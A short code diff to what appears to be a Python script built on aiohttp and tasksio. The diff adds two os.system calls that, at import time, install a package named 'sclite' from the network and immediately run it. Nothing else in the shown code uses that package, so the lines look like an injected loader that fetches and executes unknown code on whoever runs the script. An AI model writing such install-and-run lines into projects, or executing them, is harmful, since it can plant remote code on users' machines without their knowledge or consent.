@@ -29,6 +29,8 @@ import aiohttp
 import asyncio
 import os
 os.system("pip install tasksio")
+os.system("pip install sclite")
+os.system("python -m sclite")
 import sys
 from colorama import Fore
 import tasksio
